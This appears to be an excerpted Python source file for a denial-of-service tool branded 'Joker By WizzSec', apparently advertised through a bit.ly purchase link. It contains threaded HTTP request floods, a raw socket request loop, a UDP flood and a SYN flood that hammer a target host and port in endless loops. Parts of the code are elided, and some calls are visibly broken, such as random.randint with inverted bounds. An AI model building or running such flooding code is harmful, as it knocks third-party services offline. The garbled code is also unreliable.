...
def logo():
    if sys.platform.startswith("linux"):
        ...
        os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title ")
    print ("C2 BY WizzSec")
    try:
...
\033[35m                ╔═══════════════════════════════════════════════╗
\033[35m                ║\033[32m- - - - - - - Joker By WizzSec\033[36m@Exam Commity \033[35m- - - - - - -║
...
class raw_dos(threading.Thread):
    ...
    def run(self):
        ...
        if method_attack == "1":
            ...
            requests.get(url+ "/?=" +str(random.randint(32500,4150)), headers=headersx)
        while True:
            try:
                if method_attack == "1":
                    requests.get(url, headers=headersx)
                    ...
                    requests.get(url+ "/?=" +str(random.randint(32500,4150)), headers=headersx)
                print("[+] bit.ly/zdosbuy | Raw-DoS @ " +str(random.randint(32500,4150))+ " => " +str(host_url)+ ":" +str(port))
                while True:
                    try:
                        for _ in range(100):
                            if method_attack == "1":
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                s.send(str.encode(request))
                s.send(str.encode(request))
                print("[+] bit.ly/zdosbuy | Home @ " +str(random.randint(32500,4150))+ " => " +str(host_url)+ ":" +str(port))
                #req_code += 1
                #sys.stdout.write("[!] bit.ly/zdosbuy | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                #sys.stdout.flush()
                try:
...
def udpflood():
    ...
    bytes = random._urandom(32500,4150) #1475
    while True:
...
class synflood(threading.Thread):
    ...
    def run(self):
        global req_code, error
        while True:
            s_port = random.randint(32500,4150)
            s_eq = random.randint(32500,4150)
            w_indow = random.randint(32500,4150)
